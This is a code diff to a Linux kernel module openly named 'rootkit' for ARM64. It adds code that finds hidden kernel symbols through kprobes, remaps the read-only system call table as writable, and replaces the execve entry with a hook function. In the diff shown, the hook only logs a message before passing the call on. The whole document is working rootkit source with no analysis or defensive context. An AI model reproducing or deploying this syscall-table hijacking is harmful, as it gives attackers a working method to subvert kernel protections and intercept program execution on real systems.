@@ -2,6 +2,11 @@
 #include <linux/module.h>
 #include <linux/cdev.h>
 #include <linux/rculist.h>
+#include <linux/sizes.h>
+#include <linux/align.h>
+#include <asm-generic/unistd.h>
+#include <asm/pgtable-prot.h>
+#include <asm/syscall.h>
 #include "rootkit.h"
 
 #define OURMODNAME	"rootkit"
@@ -16,6 +21,9 @@ static struct class *cls;
 static struct cdev *kernel_cdev;
 static dev_t dev_no, dev;
 static unsigned long val = 0xAAAA;
+long (*arm64_exec)(const struct pt_regs *regs);
+syscall_fn_t *sys_call_table_here;
+void (*update_mapping_prot)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
 
 static void * find_symbol_by_name(const char *str) {
 	static struct kprobe kp = {
@@ -82,6 +90,12 @@ struct file_operations fops = {
 	owner:		THIS_MODULE
 };
 
+long exec_hook(const struct pt_regs *regs)
+{
+	pr_info("exec hooked boi!\n");
+	return arm64_exec(regs);
+}
+
 static int __init rootkit_init(void)
 {
 	int ret;
@@ -109,16 +123,30 @@ static int __init rootkit_init(void)
 	cls = class_create(OURMODNAME);
 	// ignore returned device pointer for simplicity
 	device_create(cls, NULL, dev, NULL, OURMODNAME);
+
+	sys_call_table_here = find_symbol_by_name("sys_call_table");
+	arm64_exec = find_symbol_by_name("__arm64_sys_execve");
+	update_mapping_prot = find_symbol_by_name("update_mapping_prot");
+
+	update_mapping_prot(ALIGN_DOWN(__pa_symbol(sys_call_table_here), SZ_2M),
+			    ALIGN_DOWN((unsigned long)lm_alias(sys_call_table_here), SZ_2M),
+			    SZ_2M, PAGE_KERNEL);
+	((unsigned long *)lm_alias(sys_call_table_here))[__NR_execve] = (unsigned long)exec_hook;
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	pr_info("%s: removed\n", OURMODNAME);
+	((unsigned long *)lm_alias(sys_call_table_here))[__NR_execve] = (unsigned long)arm64_exec;
+	update_mapping_prot(ALIGN_DOWN(__pa_symbol(sys_call_table_here), SZ_2M),
+			    ALIGN_DOWN((unsigned long)lm_alias(sys_call_table_here), SZ_2M),
+			    SZ_2M, PAGE_KERNEL_RO);
+
 	device_destroy(cls, dev);
 	class_destroy(cls);
 	cdev_del(kernel_cdev);
 	unregister_chrdev_region(major, 1);
+	pr_info("%s: removed\n", OURMODNAME);
 }
 
 module_init(rootkit_init);
